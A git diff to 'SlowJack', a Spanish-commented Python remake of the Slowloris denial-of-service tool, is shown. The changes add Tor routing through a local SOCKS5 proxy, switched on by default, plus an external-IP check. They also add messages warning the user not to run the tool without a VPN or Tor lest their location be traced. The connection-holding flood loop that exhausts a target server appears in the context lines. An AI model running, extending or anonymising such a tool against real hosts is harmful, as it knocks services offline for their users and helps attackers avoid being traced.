@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
-#Edicion Modificada por Neo-Jack Dic/2019
+#Edicion Modificada por Neo-Jack Ene/2020
 #SlowJack its a remake of SlowLoris
-
+import click    
 import argparse
 import logging
 import random
 import socket
+import socks    
+import requests 
 import sys
 import time
-from colorama import Fore, Back, Style
+from colorama import Fore, Back, Style 
 import urllib2
 
 
@@ -61,6 +63,9 @@ parser.add_argument(
     type=int,
     help="Tiempo de descanso entre cada envio header.",
 )
+
+parser.add_argument("-T", "--tor", dest="tor", action="store_true", help="Habilitar el enrutamiento TOR")
+parser.set_defaults(tor=True) 
 parser.set_defaults(verbose=True) 
 parser.set_defaults(randuseragent=True) 
 parser.set_defaults(useproxy=False)
@@ -136,7 +141,6 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Neo/20100101 Firefox/49.0",
 ]
 
-
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
@@ -162,20 +166,50 @@ def check_url( url, timeout=5 ):
     except socket.timeout as e:
         return False
 
+if args.tor is True:
+    ipcheck_url = 'http://canihazip.com/s' 
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050) 
+    socket.socket = socks.socksocket
+    try:
+        logging.info(Back.CYAN + Fore.YELLOW + Style.BRIGHT + "Comprabando la Seguridad de su RED..." + Style.RESET_ALL) 
+        tor_ip = requests.get(ipcheck_url) 
+        tor_ip = str(tor_ip.text) 
+    except requests.exceptions.RequestException as e:
+        sys.exit(0)
+
+if args.tor is False: 
+    ipcheck_url2 = 'http://canihazip.com/s' 
+    try: 
+        logging.info(Back.CYAN + Fore.YELLOW + Style.BRIGHT + "Comprabando la Seguridad de su RED..." + Style.RESET_ALL)  
+        regular_ip = requests.get(ipcheck_url2) 
+        regular_ip = str(regular_ip.text) 
+
+    except requests.exceptions.RequestException as e:
+        sys.exit(0)
 
 def main():
     ip = args.host
     socket_count = args.sockets
-
+    logging.info(Fore.GREEN + Style.BRIGHT + "Tu Host Actual es: " + socket.gethostbyname(socket.gethostname()) + Style.RESET_ALL)
+    if args.tor is True:
+       logging.info(Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.GREEN + "Activada" + Style.RESET_ALL)
+       logging.info(Fore.GREEN + Style.BRIGHT + "Nueva Tor-IP Externa: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + tor_ip + Style.RESET_ALL)
+       logging.info(Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Todo parece en orden, comencemos... " + Style.RESET_ALL )
+    if args.tor is False:
+       logging.info(Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.RED + "Desactivado"+ Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " o " + Style.RESET_ALL + Back.RED + "NO Encontrada" + Style.RESET_ALL)
+       logging.info(Fore.GREEN + Style.BRIGHT + "Tu IP Externo es: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + regular_ip + Style.RESET_ALL)
+       logging.info(Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + "Utilice siempre una conexion VPN..." + Style.RESET_ALL)
+       logging.info(Fore.YELLOW + Style.BRIGHT + "Si usted no cuenta con VPN y/o TOR" + Style.RESET_ALL)
+       logging.info(Fore.YELLOW + Style.BRIGHT + "NO se arriesgue y NO utilice este progrema." + Style.RESET_ALL)
+       logging.info(Fore.YELLOW + Style.BRIGHT + "Sin una proteccion adecuada, su ubicacion podria ser rastreada.." + Style.RESET_ALL)
+       click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
     logging.info(Back.GREEN + "Iniciando Testeo a:" + Style.RESET_ALL + Back.RED + " %s" + Style.RESET_ALL + Back.GREEN + " con "  + Style.RESET_ALL + Back.BLUE + "%s clientes." + Style.RESET_ALL, ip, socket_count)
-
     logging.info("Chequeando Estado del Servidor... 5 seg")
     resultado = check_url("http://" + args.host)
     if resultado == True:
        logging.info("Servidor %s:" + Back.GREEN + " Operando " + Style.RESET_ALL, ip)
     if not resultado == True:
        logging.info("Servidor %s:" + Back.RED +  " No Disponible " + Style.RESET_ALL, ip)
-
     logging.info(Back.BLUE +"Creando Clientes..." + Style.RESET_ALL + " Espere por favor... %s seg aprox.", socket_count//1.5)
     for _ in range(socket_count):
 
@@ -194,14 +228,12 @@ def main():
                 "Enviando headers para mantener TEST activo... Con %s Clientes", len(list_of_sockets)
             )
             logging.info("Navegadores Aleatoreas: %s", len(user_agents))
-
             logging.info("Chequeando Estado del Servidor... 5 seg")
             resultado = check_url("http://" + args.host)
             if resultado == True:
                logging.info(Style.BRIGHT + "Servidor " + Style.RESET_ALL + "%s: " + Style.RESET_ALL + Back.GREEN + "Operando. " + Style.RESET_ALL, ip)
             if not resultado == True:
                logging.info(Style.BRIGHT + "Servidor " + Style.RESET_ALL + "%s: " + Back.RED +  "No Disponible. " + Style.RESET_ALL, ip)
-
 
             for s in list(list_of_sockets):
                 try:
